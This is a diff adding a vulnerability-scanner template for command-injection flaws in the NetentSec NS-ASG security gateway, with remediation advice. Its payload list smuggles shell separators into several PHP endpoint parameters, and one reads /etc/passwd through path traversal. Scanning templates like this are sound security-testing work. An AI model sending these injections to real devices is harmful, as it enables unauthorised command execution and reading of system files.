@@ -1,0 +1,50 @@
+id: wooyun-2014-058925
+info:
+  name: NetentSec NS-ASG Application Security Gateway Command Execution
+  author:
+  - 折跃
+  description: |-
+    NetentSec NS-ASG application security gateway command execution
+    The /debug/list_logfile.php file of the NetentSec NS-ASG application security gateway is very important, but multiple parameters can cause arbitrary command execution.
+  reference:
+  - http://www.wooyun.org/bugs/wooyun-2014-058925
+  - http://www.wooyun.org/bugs/wooyun-2014-058932
+  - http://www.wooyun.org/bugs/wooyun-2014-058944
+  - http://www.wooyun.org/bugs/wooyun-2014-058987
+  severity: critical
+  remediation: |
+    Official fix:
+    1. It is recommended that users obtain the latest patch or latest version from the official website:
+
+    Temporary fix:
+    1. Avoid executing external applications or commands where possible.
+    2. Use custom functions or libraries to implement the functionality of external applications or commands.
+    3. Validate input parameters before calling functions that execute commands, such as system and eval.
+    4. Process related parameters with the escapeshellarg function. The escapeshellarg function escapes any characters that would terminate an argument or command: a single quote "'" becomes "\\'", a double quote "\"" becomes "\\\"", and a semicolon ";" becomes "\\;". This confines the argument content within a pair of single or double quotes, escaping any quotes within the argument so they cannot break out of the current execution, thereby preventing command injection attacks.
+    5. Use safe_mode_exec_dir to restrict the executable file path. Set safe_mode to On in the php.ini file, place the allowed executable files in a directory, and use safe_mode_exec_dir to specify this executable path. When an external program needs to be executed, it will only be allowed to run if it is in the directory specified by safe_mode_exec_dir; otherwise execution will fail.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,verify)
+  path:
+  - '{{BaseURL}}/{{varPath}}echo ''{{verify}}'''
+  attack: batteringram
+  method: GET
+  payloads:
+    varPath:
+    - debug/list_logfile.php?action=restartservice&bash=;
+    - debug/list_logfile.php?logfile%5B%5D=%2FIsc%2FLog%2Fsshd.log;
+    - debug/rproxy_diag.php?action=tarfile&search=&logfile[0]=../../etc/passwd|%20
+    - admin/device_status.php?action=getethinfo&ethx=a|%20
+    - admin/detail_tunel.php?type=ikev1&tunnelname=a%20|%20
+    - debug/show_logfile.php?filename=a|
+    - protocol/devicestatus/setdevicetime.php?procotalarray[messagecontent]=a|
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+  stop-at-first-match: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
